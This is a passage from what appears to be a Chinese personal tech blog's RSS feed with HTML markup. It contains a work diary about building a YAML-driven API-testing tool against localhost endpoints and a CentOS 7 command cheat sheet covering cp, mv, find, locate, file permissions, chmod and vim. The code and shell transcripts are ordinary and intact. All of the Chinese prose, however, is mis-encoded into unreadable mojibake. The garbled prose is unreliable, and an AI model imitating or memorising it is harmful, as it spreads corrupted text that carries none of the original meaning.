</span><span class="w">  </span>- <span class="nt">url</span><span class="p">:</span><span class="w"> </span><span class="l">http://127.0.0.1/corexapi/oauth/token</span><span class="w">
</span><span class="w">    </span><span class="nt">case</span><span class="p">:</span><span class="w"> </span><span class="l">case1,case2</span><span class="w">
</span><span class="w">  </span>- <span class="nt">url</span><span class="p">:</span><span class="w"> </span><span class="l">http://127.0.0.1/corexapi/external/pacs/cancelRegister</span><span class="w">
</span><span class="w">    </span><span class="nt">case</span><span class="p">:</span><span class="w"> </span><span class="l">case3,case4</span><span class="w">
</span></code></pre></td></tr></table>
</div>
</div><ul>
<li>
<p><code>url</code>ï¼šè¦æµ‹è¯•çš„æ¥å£åœ°å€</p>
</li>
<li>
<p><code>case</code>ï¼šæ¯ä¸ªURLè¦æ‰§è¡Œçš„caseï¼Œå¯ä»¥æ˜¯å¤šä¸ªå€¼ï¼Œå¯¹åº”ä¸‹é¢çš„<code>case.yaml</code>çš„ç¬¬ä¸€ä¸ª<code>key</code></p>
</li>
</ul>
<h4 id="caseå­˜æ”¾çš„é…ç½®æ–‡ä»¶">caseå­˜æ”¾çš„é…ç½®æ–‡ä»¶</h4>
<ul>
<li><code>case.yaml</code></li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-yaml" data-lang="yaml"><span class="nt">case1</span><span class="p">:</span><span class="w">
</span><span class="w">  </span><span class="nt">method</span><span class="p">:</span><span class="w"> </span><span class="l">GET</span><span class="w">
</span><span class="w">  </span><span class="nt">header</span><span class="p">:</span><span class="w">
</span><span class="w">    </span><span class="nt">Content-Type</span><span class="p">:</span><span class="w"> </span><span class="l">application/json</span><span class="w">
</span><span class="w">  </span><span class="nt">bodyType</span><span class="p">:</span><span class="w"> </span><span class="l">params</span><span class="w">
</span><span class="w">  </span><span class="nt">body</span><span class="p">:</span><span class="w">
</span><span class="w">    </span><span class="nt">test</span><span class="p">:</span><span class="w"> </span><span class="m">1</span><span class="w">
</span><span class="w">    </span><span class="nt">token</span><span class="p">:</span><span class="w"> 
</span><span class="w">  </span><span class="nt">respParame</span><span class="p">:</span><span class="w">
</span><span class="w">    </span><span class="nt">data,access_token</span><span class="p">:</span><span class="w"> </span><span class="l">case2,header,token</span><span class="w">
</span><span class="w"></span><span class="nt">case2</span><span class="p">:</span><span class="w">
</span><span class="w">  </span><span class="nt">method</span><span class="p">:</span><span class="w"> </span><span class="l">POST</span><span class="w">
</span><span class="w">  </span><span class="nt">header</span><span class="p">:</span><span class="w"> </span><span class="l">json</span><span class="w">
</span><span class="w">    </span><span class="nt">Content-Type</span><span class="p">:</span><span class="w"> </span><span class="l">application/json</span><span class="w">
</span><span class="w">    </span><span class="nt">token</span><span class="p">:</span><span class="w"> 
</span><span class="w">  </span><span class="nt">bodyType</span><span class="p">:</span><span class="w"> 
</span><span class="w">  </span><span class="nt">body</span><span class="p">:</span><span class="w">
</span><span class="w">    </span><span class="nt">test</span><span class="p">:</span><span class="w"> 
</span><span class="w">  </span><span class="nt">respParame</span><span class="p">:</span><span class="w">
</span></code></pre></td></tr></table>
</div>
</div><ul>
<li><code>method</code>ï¼šè¯·æ±‚æ–¹å¼</li>
<li><code>header</code>ï¼šè¯·æ±‚å¤´ï¼Œä¸‹é¢æ˜¯è¯·æ±‚å¤´çš„å†…å®¹ï¼Œæˆå¯¹å†™å…¥</li>
<li><code>bodyType</code>ï¼š<code>body</code>ç±»å‹</li>
<li><code>body</code>ï¼š<code>body</code>å†…å®¹</li>
<li><code>respParame</code>ï¼šç›®çš„æ˜¯æŠŠè¿”å›å€¼ä¸­æƒ³è¦çš„å‚æ•°æ‹¼æ¥åˆ°å…¶å®ƒ<code>case</code>ä¸Š
<ul>
<li><code>data,access_token</code>ï¼šä¸ºè¿”å›å‚æ•°çš„<code>key</code>ï¼Œè¦æ”¯æŒåµŒå¥—ç»“æ„ï¼Œæ¯”å¦‚ä¸‹é¢çš„ä¾‹å­ï¼Œ<code>token</code>åœ¨<code>data</code>ä¸€å±‚é‡Œé¢çš„æ—¶å€™ï¼Œä¹Ÿå¯ä»¥è·å–åˆ°</li>
<li><code>case2,header,token</code>ï¼šå–åˆ°æƒ³è¦çš„å‚æ•°åï¼ŒæŠŠè¯¥å‚æ•°æ‹¼æ¥åˆ°çš„åœ°æ–¹</li>
</ul>
</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-json" data-lang="json"><span class="p">{</span>
    <span class="nt">&#34;success&#34;</span><span class="p">:</span><span class="kc">true</span><span class="p">,</span>
    <span class="nt">&#34;code&#34;</span><span class="p">:</span><span class="mi">200</span><span class="p">,</span>
    <span class="nt">&#34;msg&#34;</span><span class="p">:</span><span class="s2">&#34;è¯·æ±‚æˆåŠŸ&#34;</span><span class="p">,</span>
    <span class="nt">&#34;data&#34;</span><span class="p">:{</span>
        	<span class="nt">&#34;access_token&#34;</span><span class="p">:</span><span class="s2">&#34;96c0549c-f56c-4991-b351-8dad3adb40c2&#34;</span><span class="p">,</span>
        	<span class="nt">&#34;token_type&#34;</span><span class="p">:</span><span class="s2">&#34;bearer&#34;</span><span class="p">,</span>
        	<span class="nt">&#34;refresh_token&#34;</span><span class="p">:</span><span class="s2">&#34;de2ee487-6036-4770-a0a0-898086199157&#34;</span><span class="p">,</span>
       		<span class="nt">&#34;expires_in&#34;</span><span class="p">:</span><span class="mi">86399</span><span class="p">,</span>
       		<span class="nt">&#34;scope&#34;</span><span class="p">:</span><span class="s2">&#34;read write&#34;</span>
        	<span class="p">}</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="å·¥ä½œæµç¨‹">å·¥ä½œæµç¨‹</h3>
<ul>
<li>å…ˆè¯»å–<code>conn.yaml</code>ï¼Œç„¶åå»éå†å¯¹åº”çš„<code>case</code>ï¼Œæ‹¿åˆ°è¯·æ±‚åè°ƒç”¨è¯·æ±‚æ–¹æ³•ï¼ŒæŠŠè¯·æ±‚å¯¹è±¡ä¼ è¿›å»ï¼Œç„¶åå†å¯¹è¿”å›å€¼åšå¤„ç†</li>
</ul>
<h2 id="20210412-2022">2021.04.12 20:22</h2>
<h3 id="ä»Šæ—¥å·¥ä½œæ±‡æŠ¥">ä»Šæ—¥å·¥ä½œæ±‡æŠ¥</h3>
<p>é¢†å¯¼æŠŠæˆ‘è–…åˆ°æµå—åˆ†éƒ¨æ¥äº†ï¼Œä»Šå¤©è·Ÿé¢†å¯¼æ²Ÿé€šäº†æŒºå¤šå…³äºæœåŠ¡ç«¯è´¨é‡ä¿éšœä½“ç³»ç›¸å…³çš„ä¸œè¥¿</p>
<p>åœ¨è¿™è¾¹å„¿å€’æ˜¯åœæ¸…é—²ï¼Œä¸è¿‡å®¾é¦†æ¡Œå­å¤ªå°äº†ï¼Œè¿˜æ²¡æ’åº§ğŸ˜­ï¼Œæ˜å¤©åœ¨å…¬å¸å¤šå‘†ä¼šå„¿</p>
<a class="lightgallery" href="/img/6EB9B7A5-619F-4A43-B634-0B1C01A19CDA.jpeg" title="/img/6EB9B7A5-619F-4A43-B634-0B1C01A19CDA.jpeg" data-thumbnail="/img/6EB9B7A5-619F-4A43-B634-0B1C01A19CDA.jpeg">
        
    </a>
<a class="lightgallery" href="/img/1CF695B2-456D-45A9-B80B-9639E8B46CAC.jpeg" title="/img/1CF695B2-456D-45A9-B80B-9639E8B46CAC.jpeg" data-thumbnail="/img/1CF695B2-456D-45A9-B80B-9639E8B46CAC.jpeg">
        
    </a>
<p>å˜¿å˜¿ï¼Œå¯ä»¥æ²¡æœ‰é¼ æ ‡ï¼Œä½†æ˜¯ä¸èƒ½æ²¡æœ‰é”®ç›˜</p>
<p>åºŸè¯ä¸è¯´äº†ï¼Œæ±‡æŠ¥å·¥ä½œæ­£å¼å¼€å§‹</p>
<h4 id="ä¿®æ”¹yamlé…ç½®æ–‡ä»¶">ä¿®æ”¹<code>yaml</code>é…ç½®æ–‡ä»¶</h4>
<ul>
<li>1.æˆ‘æŠŠ<code>case</code>çš„<code>val</code>æ”¹æˆäº†<code>json</code>å½¢å¼çš„ï¼Œ<code>yaml</code>ä¸å¥½è§£æï¼Œæ”¹å®Œå°±æ˜¯ä¸‹é¢è¿™æ ·</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-yaml" data-lang="yaml"><span class="nt">case1</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;{
</span><span class="s1">        &#34;method&#34;:&#34;POST&#34;,
</span><span class="s1">        &#34;header&#34;:{
</span><span class="s1">            &#34;content-Type&#34;:&#34;application/json&#34;
</span><span class="s1">        },
</span><span class="s1">        &#34;bodyType&#34;:&#34;form-data&#34;,
</span><span class="s1">        &#34;body&#34;:{
</span><span class="s1">            &#34;sourceSystem&#34;: &#34;corex&#34;,
</span><span class="s1">            &#34;stAppno&#34;: &#34;0xx83hd8j3972&#34;,
</span><span class="s1">            &#34;stGrpNo&#34;: &#34;2&#34;,
</span><span class="s1">            &#34;rpFindings&#34;: &#34;æµ‹è¯•æ‰€è§&#34;,
</span><span class="s1">            &#34;rpInspectCon&#34;: &#34;æµ‹è¯•ç»“è®º&#34;,
</span><span class="s1">            &#34;osrContent&#34;: &#34;&#34;,
</span><span class="s1">            &#34;rpKeyword&#34;: &#34;&#34;,
</span><span class="s1">            &#34;rpChkUserId&#34;: &#34;manager&#34;,
</span><span class="s1">            &#34;rpChkUsername&#34;: &#34;ç®¡ç†å‘˜&#34;,
</span><span class="s1">            &#34;rpChkDt&#34;: &#34;2021-01-01T18:42:40.000&#34;,
</span><span class="s1">            &#34;rpPositivePpt&#34;: &#34;&#34;,
</span><span class="s1">            &#34;rpCriticalGrade&#34;: &#34;&#34;,
</span><span class="s1">            &#34;tisID&#34;: &#34;df3192o4icu14e4daf9jf83781f6b7a1&#34;
</span><span class="s1">        },
</span><span class="s1">        &#34;files&#34;:{
</span><span class="s1">            &#34;file&#34;:&#34;test.png&#34;,
</span><span class="s1">            &#34;filePath&#34;:&#34;../files/test.png&#34;
</span><span class="s1">        }
</span><span class="s1">    }&#39;</span><span class="w">
</span></code></pre></td></tr></table>
</div>
</div><h4 id="é…ç½®æ–‡ä»¶è¯»å–ç›¸å…³ä»£ç ">é…ç½®æ–‡ä»¶è¯»å–ç›¸å…³ä»£ç </h4>
<ul>
<li>2.ä»Šå¤©æŠŠè¯»å–é…ç½®æ–‡ä»¶çš„å†™å®Œäº†ï¼Œè´´ä¸ªå›¾å§ï¼Œå†™çš„å¤ªçƒ‚ï¼Œé¢å‘<code>struct</code>ç¼–ç¨‹ç†è§£çš„å¤ªæµ…ï¼ˆçœ‹å›¾å¾—æ–°å»ºä¸ªæ ‡ç­¾é¡µğŸ˜‚ï¼‰</li>
</ul>
<a class="lightgallery" href="/img/image20210412215219.png" title="/img/image20210412215219.png" data-thumbnail="/img/image20210412215219.png">
        
    </a>
<h2 id="20210417-1601">2021.04.17 16:01</h2>
<p>å®Œæˆäº†è¯»å–é…ç½®æ–‡ä»¶çš„ä¸šåŠ¡ã€è¯·æ±‚ä¸šåŠ¡ï¼Œè¿˜å¯ä»¥å°†<code>json</code>æ ¼å¼çš„<code>response</code>ä¸­æŒ‡å®š<code>KEY</code>çš„å€¼å†™å…¥åˆ°å…¶å®ƒçš„è¯·æ±‚ä½“æˆ–è€…è¯·æ±‚å¤´é‡Œé¢å»</p>
<p>è¿™å‘¨çœ‹åˆ°äº†ä¸€ç¯‡å…³äº<code>YAML</code>çš„è¯¦ç»†æ–‡æ¡£ï¼Œå‘ç°ä¹Ÿå¾ˆå¥½è§£æï¼Œå½“æ—¶åªæ˜¯æˆ‘è‡ªå·±èœï¼Œæ²¡æœ‰å»ç½‘ä¸Šä»”ç»†æœä¸‹ğŸ˜¥ï¼Œå›å¤´å†æ”¹å›<code>yaml</code>æ ¼å¼çš„â€‹</p>
<p>æˆ‘çš„åƒåœ¾ä»£ç å·²ç»æäº¤åˆ°äº†<code>github</code>ä¸Šäº†ï¼Œç®—æ˜¯åšä¸ªè®°å½•å§<code>https://github.com/ongrui/code200</code></p>
<p>è¿˜æœ‰å…³äºæ–‡ç« çš„</p>
<p>å›¾ç‰‡å¯ä»¥æ”¾å¤§äº†ï¼ŒæŠŠæ–‡ç« å¤´éƒ¨é¢„è§ˆå»æ‰äº†</p>
]]></description>
</item><item>
    <title>linux(Centos7)ç›¸å…³å‘½ä»¤ æŒç»­æ›´æ–°...</title>
    <link>https://testoai.github.io/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/</link>
    <pubDate>Sat, 10 Apr 2021 00:00:00 &#43;0800</pubDate>
    <author>ä½œè€…</author>
    <guid>https://testoai.github.io/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/</guid>
    <description><![CDATA[<h1 id="å¼€ç¯‡å•°å—¦">å¼€ç¯‡å•°å—¦</h1>
<p>å•¥æ—¶å€™æ›´æ–°æ—¶é—´é—´éš”è¶…è¿‡ä¸‰ä¸ªæœˆæˆ‘å°±æŠŠæŒç»­æ›´æ–°å»æ‰</p>
<p>è¯è¯´ä½œä¸ºä¸€ä¸ªæµ‹è¯•ï¼Œæ˜¯ä¸æ˜¯åº”è¯¥å…ˆè®°å½•æµ‹è¯•ç›¸å…³çš„</p>
<p>å”‰ï¼Œåœ¨å…¬å¸å­¦çš„æœ€å¤šçš„å°±æ˜¯linux</p>
<p>å…ˆå†™è¿™ä¸ªå§ï¼Œæ˜å¤©å†å†™ä¸€ç¯‡æµ‹è¯•ç›¸å…³çš„</p>
<h2 id="æ–‡ä»¶æ“ä½œç›¸å…³">æ–‡ä»¶æ“ä½œç›¸å…³</h2>
<h3 id="æ–‡ä»¶æ‹·è´-cp">æ–‡ä»¶æ‹·è´ cp</h3>
<ul>
<li>æ‹·è´æ–‡ä»¶ï¼š<code>cp è¦æ‹·è´çš„æ–‡ä»¶ ç›®æ ‡è·¯å¾„</code></li>
<li>æ‹·è´æ–‡ä»¶<code>redis.conf</code>åˆ°<code>/etc/</code>ç›®å½•ä¸‹</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-tex" data-lang="tex">[root@rui redis-6.2.0]# cp redis.conf /etc/
[root@rui redis-6.2.0]# ls /etc/redis.conf 
/etc/redis.conf
</code></pre></td></tr></table>
</div>
</div><ul>
<li>æ‹·è´æ–‡ä»¶å¤¹ï¼š<code>cp -r è¦æ‹·è´çš„æ–‡ä»¶å¤¹ ç›®æ ‡è·¯å¾„</code></li>
<li>æ‹·è´æ–‡ä»¶å¤¹<code>redis-6.2.0</code>åˆ°<code>/usr/local/</code>ç›®å½•ä¸‹</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-tex" data-lang="tex">[root@rui home]# cp -r redis-6.2.0/ /usr/local/
[root@rui home]# ls /usr/local/
bin  games    lib    libexec  redis-6.2.0  share
etc  include  lib64  proc     sbin         src
</code></pre></td></tr></table>
</div>
</div><h3 id="æ–‡ä»¶ç§»åŠ¨-mv">æ–‡ä»¶ç§»åŠ¨ mv</h3>
<ul>
<li>ç§»åŠ¨æ–‡ä»¶å¤¹/æ–‡ä»¶ï¼š<code>mv è¦ç§»åŠ¨çš„æ–‡ä»¶å¤¹æˆ–è€…æ˜¯æ–‡ä»¶ ç›®æ ‡è·¯å¾„</code></li>
<li>ç§»åŠ¨æ–‡ä»¶<code>redis.conf</code>åˆ°<code>src</code>ç›®å½•ä¸‹</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-tex" data-lang="tex">[root@rui redis-6.2.0]# mv redis.conf src/
[root@rui redis-6.2.0]# ls src/redis.conf 
src/redis.conf
</code></pre></td></tr></table>
</div>
</div><h3 id="æ–‡ä»¶æŸ¥æ‰¾">æ–‡ä»¶æŸ¥æ‰¾</h3>
<ul>
<li>æ–¹å¼ä¸€ï¼š<code>find è¦æŸ¥æ‰¾çš„è·¯å¾„ -name è¦æŸ¥æ‰¾çš„æ–‡ä»¶</code></li>
<li><code>find</code>ä¼šéå†æŒ‡å®šè·¯å¾„ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ï¼Œç„¶åè¿”å›ç¬¦åˆæ¡ä»¶çš„ï¼Œæ”¯æŒæ¨¡ç³ŠæŸ¥è¯¢</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-tex" data-lang="tex">[root@rui redis-6.2.0]# find ./ -name redis.c*
./src/redis.conf
</code></pre></td></tr></table>
</div>
</div><ul>
<li>æ–¹å¼äºŒï¼š<code>locate è¦æŸ¥æ‰¾çš„æ–‡ä»¶</code></li>
<li><code>locate</code> åœ¨<code>/var/lib/mlocate/</code>ç›®å½•ä¸‹å­˜æ”¾ç€ä¸€ä¸ªæ•°æ®åº“æ–‡ä»¶ï¼Œå…¶å®ä½¿ç”¨<code>locate</code>æŸ¥è¯¢æ˜¯æŸ¥è¯¢çš„æ•°æ®åº“ï¼Œæ‰€ä»¥<code>locate</code>éå¸¸å¿«</li>
<li><code>locate</code>ä¼šè¿”å›æ‰€æœ‰åŒ…å«æ–‡ä»¶åçš„æ–‡ä»¶</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-tex" data-lang="tex">[root@rui redis-6.2.0]# locate /home/redis-6.2.0/src/red
/home/redis-6.2.0/src/redis-benchmark
/home/redis-6.2.0/src/redis-benchmark.c
/home/redis-6.2.0/src/redis-benchmark.d
/home/redis-6.2.0/src/redis-benchmark.o
/home/redis-6.2.0/src/redis-check-aof
/home/redis-6.2.0/src/redis-check-aof.c
/home/redis-6.2.0/src/redis-check-aof.d
/home/redis-6.2.0/src/redis-check-aof.o
/home/redis-6.2.0/src/redis-check-rdb
/home/redis-6.2.0/src/redis-check-rdb.c
/home/redis-6.2.0/src/redis-check-rdb.d
/home/redis-6.2.0/src/redis-check-rdb.o
/home/redis-6.2.0/src/redis-cli
/home/redis-6.2.0/src/redis-cli.c
/home/redis-6.2.0/src/redis-cli.d
/home/redis-6.2.0/src/redis-cli.o
/home/redis-6.2.0/src/redis-sentinel
/home/redis-6.2.0/src/redis-server
/home/redis-6.2.0/src/redis-trib.rb
/home/redis-6.2.0/src/redis.conf
/home/redis-6.2.0/src/redisassert.h
/home/redis-6.2.0/src/redismodule.h
</code></pre></td></tr></table>
</div>
</div><p>ç„¶åæ–°å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œå†æŸ¥è¯¢ä¸€æ¬¡</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-tex" data-lang="tex">[root@rui redis-6.2.0]# &gt; /home/redis-6.2.0/src/testfile
[root@rui redis-6.2.0]# locate /home/redis-6.2.0/src/testf
[root@rui redis-6.2.0]# ll /home/redis-6.2.0/src/testfile 
-rw-r--r--. 1 root root 0 Apr 10 22:37 /home/redis-6.2.0/src/testfile
</code></pre></td></tr></table>
</div>
</div><p>å¯ä»¥çœ‹åˆ°ï¼Œæ²¡æœ‰æŸ¥åˆ°ï¼Œå› ä¸º<code>locate</code>çš„æ•°æ®åº“ä¸æ˜¯å®æ—¶æ›´æ–°çš„ï¼Œå¯ä»¥ä½¿ç”¨<code>updatedb</code>æ‰‹åŠ¨æ›´æ–°ï¼Œä¹Ÿå¯ä»¥æŠŠæ›´æ–°å‘½ä»¤é…ç½®åˆ°ç³»ç»Ÿçš„ä»»åŠ¡è®¡åˆ’è¡¨ï¼Œå®šæ—¶æ‰§è¡Œ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-tex" data-lang="tex">[root@rui redis-6.2.0]# updatedb
[root@rui redis-6.2.0]# locate /home/redis-6.2.0/src/testf
/home/redis-6.2.0/src/testfile
</code></pre></td></tr></table>
</div>
</div><p>å¯ä»¥çœ‹åˆ°æ›´æ–°ä¹‹åå°±æŸ¥åˆ°äº†</p>
<p>2021-05-13ï¼š</p>
<h3 id="æ–‡ä»¶æƒé™ç›¸å…³">æ–‡ä»¶æƒé™ç›¸å…³</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">[root@rui nginx]# ll
total 12
drwx------ 2 root root    6 Mar  8 11:49 client_body_temp
drwxr-xr-x 2 root root 4096 May 10 11:39 conf
drwx------ 2 root root    6 Mar  8 11:49 fastcgi_temp
drwxr-xr-x 2 root root   38 Mar  8 10:50 html
drwxr-xr-x 2 root root   55 Mar 29 10:01 logs
-rw-r--r-- 1 root root 4796 May 11 20:14 nginx.conf
drwx------ 3 root root   14 Apr 29 10:04 proxy_temp
drwxr-xr-x 2 root root   18 Mar  8 10:50 sbin
drwx------ 2 root root    6 Mar  8 11:49 scgi_temp
drwx------ 2 root root    6 Mar  8 11:49 uwsgi_temp
</code></pre></td></tr></table>
</div>
</div><ul>
<li>
<p>total 12</p>
<p>linuxçš„æ•°æ®å­˜å‚¨æ˜¯ä»¥å—ï¼ˆblockï¼‰ä¸ºå•ä½çš„ï¼Œå—å¯ä»¥ç†è§£æˆä¸€ä¸ªå®¹å™¨ï¼Œæ¯ä¸ªå—çš„å¤§å°å¯ä»¥ç”¨<code>getconf PAGESIZE</code>å‘½ä»¤æŸ¥çœ‹</p>
<p>æ¯ä¸ªå—çš„å®¹é‡æ˜¯4096Bï¼Œä¹Ÿå°±æ˜¯4K</p>
</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-go" data-lang="go"><span class="nx">drwx</span><span class="o">------</span> <span class="mi">2</span> <span class="nx">root</span> <span class="nx">root</span>    <span class="mi">6</span> <span class="nx">Mar</span>  <span class="mi">8</span> <span class="mi">11</span><span class="p">:</span><span class="mi">49</span> <span class="nx">client_body_temp</span>
</code></pre></td></tr></table>
</div>
</div><p><code>drwx------</code></p>
<ul>
<li>
<p>dï¼šè¡¨ç¤ºæ–‡ä»¶å¤¹ï¼Œå¦‚æœæ˜¯-ï¼Œåˆ™ä»£è¡¨æ˜¯æ–‡ä»¶</p>
</li>
<li>
<p>rï¼šè¡¨ç¤ºæœ‰å¯è¯»æƒé™ï¼Œç”¨æ•°å­—è¡¨ç¤ºä¸º4</p>
</li>
<li>
<p>wï¼šè¡¨ç¤ºæœ‰å¯å†™æƒé™ï¼Œç”¨æ•°å­—è¡¨ç¤ºä¸º2</p>
</li>
<li>
<p>xï¼šè¡¨ç¤ºæœ‰å¯æ‰§è¡Œæƒé™ï¼Œç”¨æ•°å­—è¡¨ç¤ºä¸º1</p>
</li>
<li>
<p>rwxï¼šæ–‡ä»¶æƒé™</p>
<ul>
<li>
<p>ä¸€ä¸ªrwxå¯ä»¥ç†è§£ä¸ºä¸ºä¸€ç»„æƒé™ï¼Œä¸€ä¸ªæ–‡ä»¶æœ‰ä¸‰ç»„ï¼Œç¬¬ä¸€ç»„ä¸ºæ–‡ä»¶æ‰€å±ç”¨æˆ·ï¼Œç¬¬äºŒç»„ä¸ºæ‰€å±ç”¨æˆ·ç»„å†…çš„å…¶ä»–ç”¨æˆ·ï¼Œç¬¬ä¸‰ç»„ä¸ºå…¶ä»–ç”¨æˆ·</p>
</li>
<li>
<p>å¦‚æœæ˜¾ç¤ºä¸º&quot;-&ldquo;ç¬¦å·åˆ™è¡¨ç¤ºæ²¡æœ‰æƒé™</p>
</li>
<li>
<p>è®¾ç½®æƒé™å¯ä»¥ä½¿ç”¨<code>chmod</code></p>
</li>
</ul>
<p><code>chmod 741 filename</code></p>
<ul>
<li>741ï¼š
<ul>
<li>æ–‡ä»¶æ‰€å±ç”¨æˆ·æœ‰è¯¥æ–‡ä»¶çš„å¯è¯»ã€å¯å†™ã€å¯æ‰§è¡Œæƒé™</li>
<li>æ–‡ä»¶æ‰€å±ç”¨æˆ·ç»„å†…çš„å…¶å®ƒç”¨æˆ·æœ‰è¯¥æ–‡ä»¶çš„å¯è¯»æƒé™</li>
<li>å…¶ä»–ç”¨æˆ·æœ‰è¯¥æ–‡ä»¶çš„å¯æ‰§è¡Œæƒé™</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><code>drwx------ 2 root root 6 Mar  8 11:49 client_body_temp</code></p>
<ul>
<li>2ï¼šç¡¬è¿æ¥ä¸ªæ•°</li>
<li>ç¬¬ä¸€ä¸ªrootï¼šæ–‡ä»¶æ‰€å±ç”¨æˆ·</li>
<li>ç¬¬äºŒä¸ªrootï¼šæ–‡ä»¶æ‰€å±ç”¨æˆ·çš„ç»„</li>
<li>6ï¼šæ–‡ä»¶å¤§å°</li>
<li>Mar  8 11:49ï¼šæœ€åä¿®æ”¹æ—¶é—´</li>
<li>client_body_tempï¼šæ–‡ä»¶å/ç›®å½•å</li>
</ul>
<h2 id="vimç›¸å…³"><code>vim</code>ç›¸å…³</h2>
<h3 id="è¿›å…¥ç¼–è¾‘æ¨¡å¼">è¿›å…¥ç¼–è¾‘æ¨¡å¼</h3>
<ul>
<li>æŒ‰<code>i</code>è¿›å…¥ç¼–è¾‘æ¨¡å¼åå…‰æ ‡ä¼šåœ¨å½“å‰ä½ç½®</li>
<li>æŒ‰<code>I</code>è¿›å…¥ç¼–è¾‘æ¨¡å¼åå…‰æ ‡ä¼šåœ¨å½“å‰è¡Œè¡Œé¦–</li>
<li>æŒ‰<code>a</code>è¿›å…¥ç¼–è¾‘æ¨¡å¼åï¼Œå…‰æ ‡åœ¨å½“å‰å­—ç¬¦å</li>
<li>æŒ‰<code>A</code>è¿›å…¥ç¼–è¾‘æ¨¡å¼åï¼Œå…‰æ ‡ä¼šåœ¨å½“å‰è¡Œè¡Œå°¾</li>
<li>æŒ‰<code>o</code>è¿›å…¥ç¼–è¾‘æ¨¡å¼åï¼Œä¼šåœ¨å½“å‰è¡Œä¸‹ä¸€è¡Œæ–°å¼€ä¸€è¡Œ</li>
